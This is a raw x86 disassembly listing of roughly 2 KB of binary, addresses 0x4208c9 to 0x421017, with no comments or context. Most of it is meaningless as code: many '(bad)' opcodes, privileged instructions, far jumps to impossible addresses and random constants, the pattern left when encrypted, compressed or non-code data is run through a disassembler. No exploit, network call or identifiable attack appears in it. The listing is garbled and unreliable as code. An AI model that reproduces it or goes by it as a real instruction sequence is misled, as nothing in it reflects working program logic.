  4208c9:	lea    edx,[esi-0x45b58dc7]
  4208cf:	outs   dx,BYTE PTR ds:[esi]
  4208d0:	and    ecx,DWORD PTR [ecx+edi*1-0x69]
  4208d4:	rol    BYTE PTR [edi+0x3],cl
  4208d7:	les    ebp,FWORD PTR [ebp+0x63877a0f]
  4208dd:	inc    ebp
  4208de:	ds xchg edi,eax
  4208e0:	cli    
  4208e1:	hlt    
  4208e2:	cdq    
  4208e3:	neg    DWORD PTR [bx+si]
  4208e6:	pop    ss
  4208e7:	dec    eax
  4208e8:	(bad)  [eax-0x1f7327e8]
  4208ee:	dec    esi
  4208ef:	popf   
  4208f0:	inc    esi
  4208f1:	mov    ebx,0x5ed1d86b
  4208f6:	mov    al,ds:0xe76aff08
  4208fb:	(bad)  
  4208fc:	sbb    eax,0x642327f
  420901:	mov    al,0x4a
  420903:	inc    esi
  420904:	div    DWORD PTR [ecx-0x15]
  420907:	xor    eax,0x57516764
  42090c:	cwde   
  42090d:	pushf  
  42090e:	js     0x420907
  420910:	das    
  420911:	out    0xe0,eax
  420913:	(bad)  
  420914:	scas   al,BYTE PTR es:[edi]
  420915:	push   esi
  420916:	dec    esp
  420917:	popf   
  420918:	sub    esp,0xffffffd9
  42091b:	ficomp WORD PTR [edi]
  42091d:	rcl    BYTE PTR [edx-0x3ff9a436],cl
  420923:	adc    bh,BYTE PTR [edi+0x3797a097]
  420929:	test   BYTE PTR [eax],0x3c
  42092c:	out    0x1,eax
  42092e:	sbb    DWORD PTR [edi+0x74],esp
  420931:	pop    DWORD PTR [edx]
  420933:	test   DWORD PTR [edx-0x52],ebx
  420936:	hlt    
  420937:	sbb    DWORD PTR [eax],esp
  420939:	pop    edi
  42093a:	test   edi,esi
  42093c:	scas   al,BYTE PTR es:[edi]
  42093d:	cmp    dl,BYTE PTR [ebx+0x25]
  420940:	popf   
  420941:	inc    ecx
  420942:	leave  
  420943:	or     ebp,DWORD PTR [edx]
  420945:	push   es
  420946:	xchg   ebp,eax
  420947:	push   edi
  420948:	addr16 push ebx
  42094a:	pop    ecx
  42094b:	pop    ecx
  42094c:	jns    0x420915
  42094e:	ins    DWORD PTR es:[edi],dx
  42094f:	fidiv  DWORD PTR [ebx+0x3b929e94]
  420955:	in     al,0x3
  420957:	adc    BYTE PTR [ecx],ch
  420959:	mov    esp,0x3387821
  42095e:	pop    eax
  42095f:	jge    0x42091f
  420961:	retf   0x799c
  420964:	out    0x9,eax
  420966:	popf   
  420967:	sbb    DWORD PTR [ecx+0x324fe1d4],ecx
  42096d:	icebp  
  42096e:	and    al,0x8
  420970:	loopne 0x420989
  420972:	and    eax,0x404991a2
  420977:	lds    ebx,FWORD PTR [eax+0x16]
  42097a:	xchg   ebp,eax
  42097b:	dec    ebx
  42097c:	fs in  eax,dx
  42097e:	(bad)  
  42097f:	and    eax,0x6eaa99bb
  420984:	adc    DWORD PTR [ecx],0x28
  420987:	cmc    
  420988:	fwait
  420989:	dec    ebx
  42098a:	test   BYTE PTR [ebx-0x2a],cl
  42098d:	pop    ds
  42098e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42098f:	out    dx,eax
  420990:	sar    al,cl
  420992:	std    
  420993:	popa   
  420994:	xchg   ecx,eax
  420995:	xchg   ebp,eax
  420996:	lods   al,BYTE PTR ds:[esi]
  420997:	sbb    BYTE PTR [ebx+edx*4],cl
  42099a:	into   
  42099b:	xchg   ecx,eax
  42099c:	pop    ecx
  42099d:	in     eax,dx
  42099e:	adc    BYTE PTR [esp+ecx*2],cl
  4209a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209a2:	mov    cl,0x5
  4209a4:	or     edi,esi
  4209a6:	cmovge esp,DWORD PTR [esi+ecx*1-0x39f197f3]
  4209ae:	(bad)  
  4209af:	xor    dl,BYTE PTR [edx]
  4209b1:	daa    
  4209b2:	mov    cl,0x91
  4209b4:	lea    esi,[ebx+0x5432e39a]
  4209ba:	aad    0xda
  4209bc:	pop    edx
  4209bd:	mov    edi,0x48ea2875
  4209c2:	retf   
  4209c3:	aas    
  4209c4:	add    cl,BYTE PTR [eax+0x21]
  4209c7:	mov    esp,0x9de1454c
  4209cc:	mov    ds:0x334a03ca,al
  4209d1:	imul   edi,DWORD PTR [esp],0x44f5e0ac
  4209d8:	fild   WORD PTR [edx+0x66358499]
  4209df:	loopne 0x420a36
  4209e1:	mov    esi,0x86df59fc
  4209e6:	pop    edi
  4209e7:	cdq    
  4209e8:	dec    esi
  4209e9:	jmp    0x420a2f
  4209eb:	nop
  4209ec:	sar    bh,1
  4209ee:	mov    DWORD PTR [edi],eax
  4209f0:	mov    ds:0x75e7627f,eax
  4209f5:	jp     0x420a38
  4209f7:	jae    0x4209cb
  4209f9:	sbb    al,dl
  4209fb:	pop    esi
  4209fc:	and    esi,DWORD PTR [esi-0x47]
  4209ff:	add    DWORD PTR [edi+0x28],ecx
  420a02:	repz xchg esi,eax
  420a04:	adc    ch,BYTE PTR [ebp-0xb2391af]
  420a0a:	and    edx,esi
  420a0c:	test   al,0x6e
  420a0e:	cmp    ecx,edx
  420a10:	cwde   
  420a11:	es or  ebp,edx
  420a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a15:	mov    ds:0xd0ab324f,al
  420a1a:	fnsave [edx+0x42]
  420a1d:	mov    ebx,0x53d278f
  420a22:	adc    cl,0x36
  420a25:	cwde   
  420a26:	push   ebx
  420a27:	loope  0x420a08
  420a29:	lock (bad) 
  420a2b:	(bad)  
  420a2c:	(bad)  
  420a2e:	dec    ecx
  420a2f:	push   cs
  420a30:	call   0x45d54865
  420a35:	mov    ch,0x55
  420a37:	sbb    eax,0xf78de241
  420a3c:	and    eax,eax
  420a3e:	push   eax
  420a3f:	lahf   
  420a40:	nop
  420a41:	clc    
  420a42:	push   esp
  420a43:	jnp    0x420a63
  420a45:	leave  
  420a46:	data16 xlat BYTE PTR ds:[ebx]
  420a48:	push   cs
  420a49:	outs   dx,BYTE PTR ds:[esi]
  420a4a:	pop    edx
  420a4b:	and    DWORD PTR [ebp+0x5b],ebp
  420a4e:	pop    ebx
  420a4f:	pop    edx
  420a50:	test   DWORD PTR [ecx],edx
  420a52:	mov    dh,0xd0
  420a54:	xchg   ecx,eax
  420a55:	pop    es
  420a56:	sub    al,0xaf
  420a58:	xor    dh,dh
  420a5a:	hlt    
  420a5b:	fcomp  QWORD PTR [esi+0x56765c9e]
  420a61:	push   0xf
  420a63:	xchg   ebx,eax
  420a64:	outs   dx,DWORD PTR ds:[esi]
  420a65:	xor    ecx,DWORD PTR [ebp+edi*4-0x5e183b62]
  420a6c:	pop    ebp
  420a6d:	mov    ebp,0x9cadb522
  420a72:	adc    ch,cl
  420a74:	sbb    esp,DWORD PTR [ebp+0x54]
  420a77:	mov    ah,0x48
  420a79:	and    BYTE PTR [eax],dl
  420a7b:	add    al,0xb4
  420a7d:	push   ebp
  420a7e:	dec    ebp
  420a7f:	fnsave [eax-0x1d]
  420a82:	pop    ebp
  420a83:	aaa    
  420a84:	cmc    
  420a85:	mov    ebp,fs
  420a87:	pusha  
  420a88:	mov    ds:0x55783549,al
  420a8d:	add    al,0x58
  420a8f:	test   eax,0xe190dd2f
  420a94:	test   al,0x5a
  420a96:	mov    ds:0xf89ea8b3,al
  420a9b:	cmc    
  420a9c:	clc    
  420a9d:	icebp  
  420a9e:	ret    
  420a9f:	sar    DWORD PTR [edx+ebx*2-0x51816ddf],1
  420aa6:	repnz fst QWORD PTR [ebx-0x4b9a7a73]
  420aad:	inc    edx
  420aae:	enter  0x3351,0x20
  420ab2:	and    bl,BYTE PTR [edi+eiz*4-0x30]
  420ab6:	(bad)  
  420ab7:	sar    BYTE PTR [ebx-0x45],cl
  420aba:	rcl    eax,0x47
  420abd:	xlat   BYTE PTR ds:[ebx]
  420abe:	jmp    0xdb1051d9
  420ac3:	test   BYTE PTR [edx-0x12],ah
  420ac6:	pop    ebp
  420ac7:	mov    ebp,0x2a5a9cad
  420acc:	mov    ebx,0x1e6e0fea
  420ad1:	mov    al,0xdf
  420ad3:	mov    ch,0x5
  420ad5:	sar    DWORD PTR [edi+esi*8],cl
  420ad8:	pop    esi
  420ad9:	stos   BYTE PTR es:[edi],al
  420ada:	mov    ah,0xbc
  420adc:	xlat   BYTE PTR ds:[ebx]
  420add:	inc    edx
  420ade:	jmp    0x8b24:0x3b1d4781
  420ae5:	fs mov edx,0xf73e378f
  420aeb:	add    esi,DWORD PTR [ecx+0x41]
  420aee:	cmp    al,0xfa
  420af0:	sbb    edi,ebp
  420af2:	xchg   edi,eax
  420af3:	pop    ss
  420af4:	lar    edx,WORD PTR [ecx-0x324feea6]
  420afb:	sbb    ch,al
  420afd:	mov    eax,ds:0xacaa672d
  420b02:	adc    edi,DWORD PTR [ebp+0x2e]
  420b05:	jnp    0x420b2c
  420b07:	pushf  
  420b08:	mov    BYTE PTR [ecx+0x6d60344e],dh
  420b0e:	add    cl,BYTE PTR [edi-0x2315922c]
  420b14:	or     al,0x71
  420b16:	pop    esi
  420b17:	imul   ebp,DWORD PTR [eax+edi*1-0x6229149e],0xffffffd4
  420b1f:	pop    ecx
  420b20:	jo     0x420b02
  420b22:	dec    DWORD PTR [ebp+0x5c]
  420b25:	leave  
  420b26:	adc    eax,0xb3cf2bf4
  420b2b:	in     eax,dx
  420b2c:	and    esp,DWORD PTR [eax]
  420b2e:	ss or  edx,edx
  420b31:	fist   WORD PTR [ecx+0x2e]
  420b34:	or     eax,0x31be7ee8
  420b39:	cli    
  420b3a:	iret   
  420b3b:	jne    0x420b13
  420b3d:	pushf  
  420b3e:	cli    
  420b3f:	aaa    
  420b40:	bound  ebp,QWORD PTR [esi]
  420b42:	push   ss
  420b43:	sub    DWORD PTR gs:[esi+0x2bfedbdd],ecx
  420b4a:	xchg   esi,eax
  420b4b:	scas   al,BYTE PTR es:[edi]
  420b4c:	mov    edx,0xcaa5abef
  420b51:	inc    eax
  420b52:	dec    edx
  420b53:	push   ss
  420b54:	xor    dh,ch
  420b56:	and    DWORD PTR [edx-0xe274137],edx
  420b5c:	fs dec edi
  420b5e:	mov    bh,0xe1
  420b60:	inc    ebp
  420b61:	xchg   ecx,eax
  420b62:	sub    esi,DWORD PTR [ebp-0x2923f885]
  420b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b69:	or     DWORD PTR [ebx],esp
  420b6b:	add    DWORD PTR [edx],esi
  420b6d:	xlat   BYTE PTR ds:[ebx]
  420b6e:	cmc    
  420b6f:	mov    ebx,eax
  420b71:	ja     0x420b91
  420b73:	and    dl,BYTE PTR ds:0xf46ef35b
  420b79:	cld    
  420b7a:	aad    0x92
  420b7c:	pop    edx
  420b7d:	dec    esi
  420b7e:	scas   al,BYTE PTR es:[edi]
  420b7f:	push   esi
  420b80:	icebp  
  420b81:	sub    eax,DWORD PTR [bp+di]
  420b84:	dec    ebx
  420b85:	retf   0x83a0
  420b88:	sti    
  420b89:	popf   
  420b8a:	sub    DWORD PTR [edx],edi
  420b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b8d:	or     cl,BYTE PTR [ebx+0x149a0f09]
  420b93:	pop    edx
  420b94:	jle    0x420b1a
  420b96:	mov    bh,bh
  420b98:	shl    BYTE PTR [edx+eiz*2],cl
  420b9b:	mov    esp,0x932f31ac
  420ba0:	push   0xe650ac40
  420ba5:	mov    eax,0x8c13f323
  420baa:	add    cl,BYTE PTR [eax-0x17]
  420bad:	add    DWORD PTR [eax],edx
  420baf:	int    0xa5
  420bb1:	in     al,dx
  420bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bb3:	loope  0x420be0
  420bb5:	test   BYTE PTR [edi],dl
  420bb7:	jge    0x420bf5
  420bb9:	xor    esp,edx
  420bbb:	inc    edi
  420bbc:	xchg   BYTE PTR [ebp+0x4038e2d3],ch
  420bc2:	sbb    BYTE PTR [eax+edi*2+0x78],bl
  420bc6:	iret   
  420bc7:	push   eax
  420bc8:	jae    0x420be3
  420bca:	stc    
  420bcb:	push   eax
  420bcc:	cmp    al,0x59
  420bce:	sbb    edx,DWORD PTR [eax]
  420bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bd1:	outs   dx,BYTE PTR ds:[esi]
  420bd2:	icebp  
  420bd3:	fadd   DWORD PTR [edx-0x521a03dc]
  420bd9:	mov    al,0x86
  420bdb:	lods   eax,DWORD PTR ds:[esi]
  420bdc:	sbb    cl,dl
  420bde:	fnsave [ebp-0x20]
  420be1:	xchg   esp,eax
  420be2:	es leave 
  420be4:	aas    
  420be5:	daa    
  420be6:	pop    esi
  420be7:	xadd   BYTE PTR [edi-0x620f41bb],dl
  420bee:	les    esi,FWORD PTR [ecx]
  420bf0:	and    eax,0xc5dccca0
  420bf5:	aas    
  420bf6:	sbb    esi,ebx
  420bf8:	mov    ds:0x26d29ffd,eax
  420bfd:	je     0x420bba
  420bff:	ss (bad) 
  420c01:	push   es
  420c02:	into   
  420c03:	ja     0x420bba
  420c05:	sbb    DWORD PTR [eax+0x225823cf],esp
  420c0b:	and    DWORD PTR [ebx+0x1b215177],edx
  420c11:	push   edx
  420c12:	fcmovnu st,st(0)
  420c14:	ins    BYTE PTR es:[edi],dx
  420c15:	sub    dh,BYTE PTR [esi+eiz*8]
  420c18:	xor    al,0x77
  420c1a:	jno    0x420c4d
  420c1c:	jle    0x420c3d
  420c1e:	dec    ebx
  420c1f:	xor    DWORD PTR [edx],ebp
  420c21:	mov    edi,0xd54e5841
  420c26:	mov    edx,0x43d0da9c
  420c2b:	and    esi,DWORD PTR [edx]
  420c2d:	pop    ebx
  420c2e:	shl    cl,0x70
  420c31:	cld    
  420c32:	ins    BYTE PTR es:[edi],dx
  420c33:	bound  eax,QWORD PTR ss:[si-0x51d0]
  420c39:	ds inc esp
  420c3b:	jae    0x420c1d
  420c3d:	sub    eax,0xe3b07529
  420c42:	cwde   
  420c43:	xor    esi,DWORD PTR [ebx]
  420c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c46:	sub    al,0xd8
  420c48:	mov    ch,BYTE PTR [edi-0x45]
  420c4b:	mov    ah,0x24
  420c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c4e:	sub    bl,ah
  420c50:	mov    ah,0x20
  420c52:	sub    BYTE PTR [ebx],0x6e
  420c55:	mov    ebx,0x98ca3c16
  420c5a:	cmp    eax,0xcd1238d3
  420c5f:	mov    ah,0xa8
  420c61:	data16 in al,0x24
  420c64:	outs   dx,DWORD PTR ds:[esi]
  420c65:	xor    eax,esp
  420c67:	arpl   WORD PTR [esi],sp
  420c69:	jecxz  0x420c40
  420c6b:	nop
  420c6c:	pop    esp
  420c6d:	mov    dl,0x33
  420c6f:	ret    
  420c70:	pop    esp
  420c71:	or     edx,DWORD PTR [esi-0x4b]
  420c74:	ja     0x420cbe
  420c76:	mul    BYTE PTR [eax+ebp*8-0xb8c50ce]
  420c7d:	lea    esp,[ebx]
  420c7f:	mov    edi,0x8f94ba11
  420c84:	sti    
  420c85:	nop
  420c86:	inc    ebx
  420c87:	mov    cl,0x3b
  420c89:	xor    bl,BYTE PTR ds:0x3b837c7a
  420c8f:	jns    0x420d09
  420c91:	cmp    DWORD PTR ds:0x7e0c9ed8,eax
  420c97:	xchg   ecx,eax
  420c98:	(bad)  
  420c9a:	(bad)  
  420c9b:	outs   dx,DWORD PTR ds:[esi]
  420c9c:	aas    
  420c9d:	sub    al,0x1c
  420c9f:	mov    ebp,0x97b43433
  420ca4:	cmp    DWORD PTR [edi-0x28],esp
  420ca7:	pop    esi
  420ca8:	repz std 
  420caa:	xchg   edx,eax
  420cab:	iret   
  420cac:	test   eax,0x72facecc
  420cb1:	add    dl,BYTE PTR [edi+ebp*4]
  420cb4:	sub    DWORD PTR [edi+0x7820c2cf],0xffffffa4
  420cbb:	pop    edi
  420cbc:	add    dh,BYTE PTR [edx-0x35]
  420cbf:	add    al,0x2
  420cc1:	pop    ebp
  420cc2:	cwde   
  420cc3:	aaa    
  420cc4:	add    DWORD PTR [esi+0x56],esp
  420cc7:	inc    ebp
  420cc8:	(bad)  
  420cc9:	or     edi,esp
  420ccb:	sub    DWORD PTR [ecx+0x10e583ce],esi
  420cd1:	sbb    ch,dh
  420cd3:	hlt    
  420cd4:	push   ebx
  420cd5:	mov    esp,0x11ebcd58
  420cda:	inc    ecx
  420cdb:	pop    ebx
  420cdc:	jmp    0x420d53
  420cde:	shl    DWORD PTR [ecx],cl
  420ce0:	mov    esp,0x68def3ed
  420ce5:	cmp    DWORD PTR [edx-0x6b],esi
  420ce8:	popa   
  420ce9:	xor    al,BYTE PTR [esi]
  420ceb:	push   edi
  420cec:	rcl    BYTE PTR [ecx],1
  420cee:	fwait
  420cef:	push   eax
  420cf0:	aad    0x37
  420cf2:	add    DWORD PTR [esi+eax*4-0x3c53feb1],ebx
  420cf9:	sbb    DWORD PTR [esi],esp
  420cfb:	call   0x98e5cdc3
  420d00:	xor    bl,ah
  420d02:	icebp  
  420d03:	out    dx,al
  420d04:	adc    al,0x8f
  420d06:	push   esp
  420d07:	idiv   BYTE PTR [edx+0x5b]
  420d0a:	inc    ecx
  420d0b:	xor    DWORD PTR [edi],esp
  420d0d:	inc    ebx
  420d0e:	xchg   edx,eax
  420d0f:	jecxz  0x420ccf
  420d11:	fstp   DWORD PTR [ecx-0x70bf7062]
  420d17:	shr    ecx,1
  420d19:	test   BYTE PTR [edi+0x65],dh
  420d1c:	(bad)  
  420d1e:	jg     0x420d75
  420d20:	fcom   QWORD PTR [ebx-0x11]
  420d23:	scas   eax,DWORD PTR es:[edi]
  420d24:	dec    edi
  420d25:	scas   eax,DWORD PTR es:[edi]
  420d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d27:	icebp  
  420d28:	shl    DWORD PTR [edi],1
  420d2a:	lods   al,BYTE PTR ds:[esi]
  420d2b:	adc    BYTE PTR [ecx-0x2d80fb98],0x73
  420d32:	stos   DWORD PTR es:[edi],eax
  420d33:	sub    bl,bh
  420d35:	pop    es
  420d36:	pmuludq mm7,QWORD PTR [ecx-0x1b6ca463]
  420d3d:	imul   edi,DWORD PTR [edx+ebp*8-0x408751f7],0xffffffa0
  420d45:	cli    
  420d46:	push   esi
  420d47:	mov    ebp,0x417b07a2
  420d4c:	pushf  
  420d4d:	pop    esi
  420d4e:	and    cl,BYTE PTR [ebx]
  420d50:	add    eax,DWORD PTR [esi]
  420d52:	xchg   DWORD PTR [edi-0x15a2dcce],ebx
  420d58:	test   al,0xcd
  420d5a:	sbb    DWORD PTR [esi+0x67fcde60],0x422c9388
  420d64:	ds dec edi
  420d66:	rcl    bl,0xef
  420d69:	fstp   TBYTE PTR [eax-0x4a7ec13b]
  420d6f:	rcr    ch,cl
  420d71:	(bad)  [ebx-0x47]
  420d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d75:	jno    0x420dc5
  420d77:	mov    edi,0xc36c1612
  420d7c:	xor    eax,DWORD PTR [esi+0x4cf45a24]
  420d82:	pop    ebp
  420d83:	dec    edx
  420d84:	outs   dx,DWORD PTR ds:[esi]
  420d85:	cmp    ebx,ebp
  420d87:	or     cl,dh
  420d89:	xchg   edi,eax
  420d8a:	les    esi,FWORD PTR [eax-0x39]
  420d8d:	sbb    eax,0x83da02b9
  420d92:	and    cl,ah
  420d94:	jecxz  0x420d8b
  420d96:	sub    al,0xb4
  420d98:	pop    esi
  420d99:	push   edi
  420d9a:	pusha  
  420d9b:	retf   
  420d9c:	not    DWORD PTR [ebx]
  420d9e:	loope  0x420d89
  420da0:	(bad)  
  420da1:	aad    0x1d
  420da3:	jo     0x420db2
  420da5:	mov    ds:0x497cca3,al
  420daa:	adc    edx,DWORD PTR [edi-0x6f]
  420dad:	add    eax,0x8b29902f
  420db2:	dec    eax
  420db3:	cld    
  420db4:	adc    cl,BYTE PTR [edi-0x6a1b94f6]
  420dba:	push   ebx
  420dbb:	or     al,0xdc
  420dbd:	xchg   ebx,eax
  420dbe:	es je  0x420d57
  420dc1:	ret    
  420dc2:	cmp    bh,cl
  420dc4:	mov    dl,0x7
  420dc6:	cmp    DWORD PTR ds:0x59c00e72,0x970b33ad
  420dd0:	push   edx
  420dd1:	bound  ecx,QWORD PTR [edi+0x62]
  420dd4:	push   ebx
  420dd5:	add    al,0x51
  420dd7:	(bad)  
  420dd8:	cmc    
  420dd9:	ins    DWORD PTR es:[edi],dx
  420dda:	and    DWORD PTR [ecx+0x10],0x485bb7dc
  420de1:	in     al,dx
  420de2:	je     0x420d6f
  420de4:	addr16 mov eax,0x33840216
  420dea:	scas   eax,DWORD PTR es:[edi]
  420deb:	icebp  
  420dec:	addr16 pop ebp
  420dee:	(bad)  
  420def:	out    dx,al
  420df0:	inc    ebp
  420df1:	push   0xc85c1419
  420df6:	nop
  420df7:	inc    edx
  420df8:	das    
  420df9:	out    dx,eax
  420dfa:	inc    ecx
  420dfb:	shl    ecx,cl
  420dfd:	pop    es
  420dfe:	mov    edi,0xf6f5ef2d
  420e03:	int    0xbd
  420e05:	sbb    al,0x31
  420e07:	retf   0xda82
  420e0a:	dec    eax
  420e0b:	retf   0x86e0
  420e0e:	loope  0x420dfd
  420e10:	pop    es
  420e11:	dec    esi
  420e12:	xor    al,0x89
  420e14:	imul   ebx,DWORD PTR [ecx+0xd27e17],0xffffffb6
  420e1b:	out    dx,eax
  420e1c:	into   
  420e1d:	mov    al,ds:0x2b2d143b
  420e22:	div    ah
  420e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e25:	add    eax,0x79f4050c
  420e2a:	in     eax,dx
  420e2b:	dec    esi
  420e2c:	(bad)  
  420e2d:	mov    ch,0xde
  420e2f:	mov    edx,0xb43cad4f
  420e34:	lahf   
  420e35:	push   esp
  420e36:	mov    dh,0x8
  420e38:	lods   al,BYTE PTR ds:[esi]
  420e39:	xor    ah,BYTE PTR ds:[edi+0x5507ce99]
  420e40:	(bad)  
  420e41:	mov    dl,0xae
  420e43:	outs   dx,BYTE PTR ds:[esi]
  420e44:	or     eax,0x7036a7e0
  420e49:	dec    eax
  420e4a:	xchg   ebx,eax
  420e4b:	jne    0x420e10
  420e4d:	xor    BYTE PTR [eax-0xc],bh
  420e50:	xchg   edx,eax
  420e51:	jecxz  0x420eb6
  420e53:	jmp    0xb03a:0x887c8ba3
  420e5a:	sub    DWORD PTR [ebp-0x4c822a6d],0xffffffb8
  420e61:	popf   
  420e62:	daa    
  420e63:	pop    esp
  420e64:	retf   
  420e65:	dec    esi
  420e66:	add    al,0x43
  420e69:	data16 fild WORD PTR [ebp-0x1a1caf2a]
  420e70:	xchg   ecx,eax
  420e71:	push   ds
  420e72:	mov    bl,0xfa
  420e74:	xchg   edi,eax
  420e75:	lods   al,BYTE PTR ds:[esi]
  420e76:	ja     0x420eab
  420e78:	push   DWORD PTR [ecx]
  420e7a:	leave  
  420e7b:	fucomp st(2)
  420e7d:	push   edx
  420e7e:	repnz dec edi
  420e80:	in     al,dx
  420e81:	lods   eax,DWORD PTR ds:[esi]
  420e82:	push   ebx
  420e83:	mov    cl,0x95
  420e85:	jae    0x420e8b
  420e87:	jnp    0x420ecf
  420e89:	es xchg ebx,eax
  420e8b:	jecxz  0x420e1c
  420e8d:	sbb    BYTE PTR [ebp+0x1b],0xc6
  420e91:	lods   al,BYTE PTR ds:[esi]
  420e92:	xor    esi,edi
  420e94:	bound  esp,QWORD PTR [eax+esi*8-0x3de15e7a]
  420e9b:	repz aas 
  420e9d:	fwait
  420e9e:	push   esp
  420e9f:	inc    esi
  420ea0:	mov    ebp,0x8221b9cb
  420ea5:	inc    edi
  420ea6:	mov    bl,0xf1
  420ea8:	dec    ebp
  420ea9:	sbb    edi,eax
  420eab:	into   
  420eac:	fwait
  420ead:	push   cs
  420eae:	shl    BYTE PTR [edx+eiz*1],1
  420eb1:	cmp    BYTE PTR [esi+0x79],dh
  420eb4:	pop    esi
  420eb5:	rcr    DWORD PTR [esi+0x63343911],1
  420ebb:	ror    BYTE PTR [ebx],cl
  420ebd:	inc    eax
  420ebf:	faddp  st(7),st
  420ec1:	mov    eax,0xb94c7ca1
  420ec6:	and    DWORD PTR [ebp+0x54],ebx
  420ec9:	test   ch,al
  420ecb:	jle    0x420e53
  420ecd:	addr16 ret 
  420ecf:	push   esi
  420ed0:	shr    BYTE PTR [eax],cl
  420ed2:	sub    edi,DWORD PTR [ebp-0xa1607ce]
  420ed8:	mov    eax,ds:0x9d90e9c4
  420edd:	pop    DWORD PTR [edi+0xc]
  420ee0:	dec    eax
  420ee1:	mov    esp,0xf6b463f8
  420ee6:	imul   edi,DWORD PTR ds:0x90675415,0x42
  420eed:	jecxz  0x420f20
  420eef:	mov    edi,0x40827cae
  420ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ef5:	dec    ebp
  420ef6:	out    dx,eax
  420ef7:	(bad)  
  420ef8:	std    
  420ef9:	stc    
  420efa:	ud2    
  420efc:	inc    ebp
  420efd:	mov    cl,0x52
  420eff:	jbe    0x420ed4
  420f01:	jbe    0x420eb0
  420f03:	fiadd  DWORD PTR [esi-0x232ff423]
  420f09:	adc    cl,cl
  420f0b:	mov    ds:0x429a244b,eax
  420f10:	xchg   ecx,eax
  420f11:	sbb    BYTE PTR [ecx],bl
  420f13:	in     eax,dx
  420f14:	repz ror BYTE PTR [edi],cl
  420f17:	in     eax,0x78
  420f19:	xchg   ebp,eax
  420f1a:	(bad)  
  420f1b:	xchg   edi,eax
  420f1c:	popf   
  420f1d:	jbe    0x420ea3
  420f1f:	mov    dl,0x2b
  420f21:	scas   al,BYTE PTR es:[edi]
  420f22:	(bad)  
  420f23:	(bad)  
  420f24:	sub    DWORD PTR [ecx],ebx
  420f26:	dec    ebp
  420f27:	push   esi
  420f28:	js     0x420fa1
  420f2a:	xchg   ebx,eax
  420f2b:	pusha  
  420f2c:	sti    
  420f2d:	iret   
  420f2e:	loope  0x420ed5
  420f30:	jb     0x420eda
  420f32:	sbb    DWORD PTR [ecx],eax
  420f34:	mov    ah,BYTE PTR [edx]
  420f36:	(bad)  
  420f37:	call   0x146e5276
  420f3c:	sub    bl,BYTE PTR [ecx+0x1d]
  420f3f:	ins    DWORD PTR es:[edi],dx
  420f40:	pop    esp
  420f41:	nop
  420f42:	adc    esp,eax
  420f44:	add    eax,0xde43bee5
  420f49:	rol    DWORD PTR [edi+ecx*2],1
  420f4c:	inc    edx
  420f4d:	dec    esi
  420f4e:	addr16 push edx
  420f50:	xchg   ebp,eax
  420f51:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  420f53:	in     al,0x30
  420f55:	mov    eax,0xf9f3a4a7
  420f5a:	imul   esp,DWORD PTR [ebx],0xc8e3dc51
  420f60:	hlt    
  420f61:	sti    
  420f62:	push   esi
  420f63:	push   ebx
  420f64:	cs call 0x180fc9e8
  420f6a:	dec    BYTE PTR [ebx]
  420f6c:	xor    ebp,DWORD PTR [edx]
  420f6e:	add    al,0x17
  420f70:	std    
  420f71:	aad    0x7a
  420f73:	(bad)  
  420f74:	(bad)  
  420f75:	mov    ecx,DWORD PTR [edx-0x3a]
  420f78:	out    dx,al
  420f79:	cmc    
  420f7a:	(bad)  
  420f7b:	cdq    
  420f7c:	dec    ebp
  420f7d:	mov    ebx,0x6eb89b6e
  420f82:	ja     0x420ff5
  420f84:	pusha  
  420f85:	retf   0xf196
  420f88:	xchg   ecx,eax
  420f89:	lods   eax,DWORD PTR ds:[esi]
  420f8a:	xchg   ecx,eax
  420f8b:	cli    
  420f8c:	jg     0x420fac
  420f8e:	xchg   esp,eax
  420f8f:	ds ret 0x941
  420f93:	sbb    DWORD PTR [esi-0x4],edi
  420f96:	push   esp
  420f97:	aam    0x46
  420f99:	repnz ds leave 
  420f9c:	mov    eax,ds:0xb7baa9cb
  420fa1:	xchg   ecx,eax
  420fa2:	jecxz  0x420f59
  420fa4:	mov    al,ds:0xdb6e272c
  420fa9:	jne    0x420f90
  420fab:	shr    cl,cl
  420fad:	(bad)  
  420fae:	dec    edi
  420faf:	jo     0x420f42
  420fb1:	loop   0x420fbb
  420fb3:	sbb    DWORD PTR [ecx-0x72d43c52],edx
  420fb9:	ja     0x420ffc
  420fbb:	mov    eax,ds:0x36d82c05
  420fc0:	nop
  420fc1:	(bad)  
  420fc2:	fdivr  st,st(7)
  420fc4:	pop    es
  420fc5:	mov    ecx,0xbf5d8780
  420fca:	push   es
  420fcb:	bound  edx,QWORD PTR [eax-0x6f]
  420fce:	push   esi
  420fcf:	add    al,BYTE PTR [ebx]
  420fd1:	in     al,dx
  420fd2:	sub    ecx,DWORD PTR ds:0xfead43a3
  420fd8:	cmp    bl,0x77
  420fdb:	mov    ecx,0xc526f623
  420fe0:	push   ecx
  420fe1:	(bad)  
  420fe3:	arpl   si,si
  420fe5:	lods   eax,DWORD PTR ds:[esi]
  420fe6:	arpl   sp,ax
  420fe8:	mov    ch,0x6f
  420fea:	neg    DWORD PTR [ebp-0x71aa1d2e]
  420ff0:	hlt    
  420ff1:	or     DWORD PTR [ebx+0x7824e574],eax
  420ff7:	add    DWORD PTR [edi],esp
  420ff9:	mov    bl,0x26
  420ffb:	jae    0x421073
  420ffd:	jae    0x421052
  420fff:	pop    ebp
  421000:	test   DWORD PTR [ebp+0x41],esp
  421003:	pusha  
  421004:	jge    0x421059
  421006:	int3   
  421007:	jbe    0x42102c
  421009:	aas    
  42100a:	fcomp  DWORD PTR ds:0x3b443f62
  421010:	push   ebp
  421011:	leave  
  421012:	jb     0x420fec
  421014:	xchg   DWORD PTR [ebp-0x26],eax
  421017:	cmp    ah,al
